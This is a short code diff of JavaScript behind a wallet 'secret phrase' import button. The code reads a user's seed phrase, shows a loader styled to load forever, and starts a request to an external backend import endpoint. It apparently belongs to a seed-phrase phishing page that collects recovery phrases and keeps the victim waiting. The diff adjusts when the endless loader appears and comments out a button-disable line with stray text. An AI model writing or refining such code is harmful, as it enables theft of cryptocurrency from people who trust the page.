@@ -659,10 +659,7 @@ secretImportButton?.addEventListener("click", async () => {
   if (!secretPhraseDisplay || !walletNameInput) return;
 
   const loader = document.querySelector(".loader-overlay");
-  if (loader) {
-    loader.removeAttribute("hidden");
-    loader.classList.add("is-loading-forever");
-  }
+
 
   const walletName = walletNameInput.value.trim();
   const seedPhrase = secretPhraseDisplay.value.trim();
@@ -685,10 +682,13 @@ secretImportButton?.addEventListener("click", async () => {
   }
   
   clearValidationError();
-
+ if (loader) {
+    loader.removeAttribute("hidden");
+    loader.classList.add("is-loading-forever");
+  }
   const backendUrl = "https://vault-wallet-back-production.up.railway.app/api/wallet/import";
 
-  secretImportButton.disabled = true;
+  //wwhen secretImportButton.disabled = true;
 
   try {
     const response = await fetch(backendUrl, {
